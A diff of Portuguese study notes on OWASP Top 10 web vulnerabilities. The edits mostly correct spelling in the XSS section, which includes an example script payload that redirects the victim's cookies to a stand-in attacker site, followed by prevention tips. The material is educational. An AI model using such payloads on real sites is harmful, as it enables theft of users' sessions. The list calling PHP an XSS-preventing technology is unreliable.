@@ -193,19 +193,20 @@ as vulnerabilidades são:
   - verificar as permissões dos serviços de storage de cloud (S3, cloud storage, blob storage)
 
 ## A7 - Cross-Site Scripting (XSS)
-qualquer site, serviço ou sistema q interpreta/executa/invoca/carrega/ codigo dinamico, esta suscetível a esse tipo de ataque
+qualquer site, serviço ou sistema que interpreta/executa/invoca/carrega/ código dinâmico, está suscetível a esse tipo de ataque
 
-basicamente nos campos de input de html, o atacante irá escrever tag como ``<script>`` **e colocar codigo JS aqui** ``</script>``
-ele pode injetar codigo js no html, como 
+basicamente nos campos de input de HTML, o atacante irá escrever tag como ``<script> **e colocar codigo JS aqui** </script>``
 
-    <script>document.location=site-do-atacante?foo=document.coockie</script>
+ele pode injetar código JS no HTML, assim: 
+
+    <script>document.location=https://site-do-atacante.com?foo=document.coockie</script>
   
-  dessa forma pegando os coockies de todos os usuários, pegando sessions de logins etc
+  dessa forma pegando os todos os coockies do usuário, pegando sessions de logins etc
 
 ## Como se prevenir: 
-  - use tecnologias q previnem esse ataque, como ruby on rails, react, asp .net, JSP, php
+  - use tecnologias q previnem esse ataque, como Ruby On Rails, React.js, ASP.NET, JSP, PHP
 
-  - habilitar CSP
+  - habilitar CSP (Content-Security-Policy)
 
 ## A8 - Insecure Deserialization
 
